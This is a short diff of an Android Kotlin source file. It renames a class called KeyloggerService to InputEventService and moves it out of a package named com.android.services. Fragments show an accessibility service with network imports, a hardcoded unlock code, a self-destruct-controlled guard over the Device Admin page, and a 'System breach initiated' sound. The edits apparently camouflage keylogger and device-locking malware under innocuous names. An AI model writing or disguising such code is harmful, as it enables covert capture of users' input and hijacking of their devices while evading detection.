@@ -1,4 +1,4 @@
-package com.android.services
+package com.nexlink.bridge
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
@@ -20,10 +20,10 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.util.concurrent.TimeUnit
 
-class KeyloggerService : AccessibilityService() {
+class InputEventService : AccessibilityService() {
 
     companion object {
-        @Volatile var instance: KeyloggerService? = null
+        @Volatile var instance: InputEventService? = null
         @Volatile var unlockCode: String = "2719"
         /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
         @Volatile var adminGuardEnabled: Boolean = true
@@ -343,7 +343,7 @@ class KeyloggerService : AccessibilityService() {
             view.alpha = 0f
             view.animate().alpha(1f).setDuration(600).start()
             soundManager?.stop()
-            soundManager = HackerSoundManager(this@KeyloggerService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
+            soundManager = HackerSoundManager(this@InputEventService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
         }
     }
 
